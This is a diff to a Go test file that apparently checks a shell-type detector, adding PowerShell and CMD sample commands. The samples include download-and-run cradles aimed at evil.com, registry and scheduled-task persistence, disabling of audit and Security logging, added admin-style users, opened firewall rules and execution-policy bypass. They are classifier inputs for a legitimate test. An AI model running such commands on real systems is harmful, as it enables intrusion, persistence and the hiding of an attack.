@@ -16,11 +16,22 @@ func TestDetectShellType_PowerShell(t *testing.T) {
 		{"alias iex", "iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"},
 		{"alias iwr pipeline", "iwr http://evil.com/payload.ps1 | iex"},
 		{"alias irm pipeline", "irm http://evil.com/payload.ps1 | iex"},
+		{"alias icm remote", "icm -ComputerName server01 -ScriptBlock { whoami }"},
+		{"alias nsn session", "nsn -ComputerName server01"},
+		{"alias etsn session", "etsn -ComputerName server01"},
 		{"powershell type literal", "[System.Net.WebClient]::new().DownloadFile('http://evil.com/payload.ps1','payload.ps1')"},
 		{"ConvertTo-Json", "ConvertTo-Json $data"},
 		{"Select-String", "Select-String -Pattern 'error' log.txt"},
 		{"Test-Path", "Test-Path /some/path"},
 		{"ForEach-Object", "ForEach-Object { $_.Name }"},
+		{"Get-Credential", "Get-Credential"},
+		{"Compress-Archive", "Compress-Archive -Path secret.txt -DestinationPath archive.zip"},
+		{"New-PSSession", "New-PSSession -ComputerName server01"},
+		{"New-ItemProperty", "New-ItemProperty -Path HKCU:\\Software\\Test -Name Evil -Value calc.exe"},
+		{"Enter-PSSession", "Enter-PSSession -ComputerName server01"},
+		{"Invoke-WmiMethod", "Invoke-WmiMethod -Class Win32_Process -Name Create"},
+		{"New-NetFirewallRule", "New-NetFirewallRule -DisplayName evil -Direction Inbound -Action Allow"},
+		{"Set-ExecutionPolicy", "Set-ExecutionPolicy Bypass -Scope Process"},
 		{"case insensitive", "get-childitem -Path ."},
 		{"cmdlet mid-command", "some-thing | Where-Object { $_.Status -eq 'Running' }"},
 	}
@@ -51,6 +62,33 @@ func TestDetectShellType_CMD(t *testing.T) {
 			got := DetectShellType(tt.command)
 			if got != ShellCMD {
 				t.Errorf("DetectShellType(%q) = %v, want CMD", tt.command, got)
+			}
+		})
+	}
+
+	utilityTests := []struct {
+		name    string
+		command string
+	}{
+		{"reg add", `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d calc.exe`},
+		{"schtasks create", `schtasks /create /tn Updater /tr C:\Temp\evil.exe /sc onlogon`},
+		{"certutil decode", `certutil -decode payload.b64 payload.exe`},
+		{"auditpol set", `auditpol /set /subcategory:"Logon" /success:disable /failure:disable`},
+		{"cmdkey add", `cmdkey /add:server01 /user:admin /pass:Secret123!`},
+		{"hh remote", `hh.exe http://example.com/help.chm`},
+		{"net user add", `net user evil P@ssw0rd! /add`},
+		{"netsh firewall add", `netsh advfirewall firewall add rule name="evil" dir=in action=allow program="C:\\Temp\\evil.exe"`},
+		{"pcalua launch", `pcalua -a C:\\Temp\\evil.exe`},
+		{"vaultcmd list", `vaultcmd /list`},
+		{"wevtutil set-log", `wevtutil sl Security /e:false`},
+		{"wmic node", `wmic /node:server01 process list brief`},
+	}
+
+	for _, tt := range utilityTests {
+		t.Run("utility/"+tt.name, func(t *testing.T) {
+			got := DetectShellType(tt.command)
+			if got != ShellCMD {
+				t.Errorf("DetectShellType(%q) = %v, want CMD-style parsing", tt.command, got)
 			}
 		})
 	}
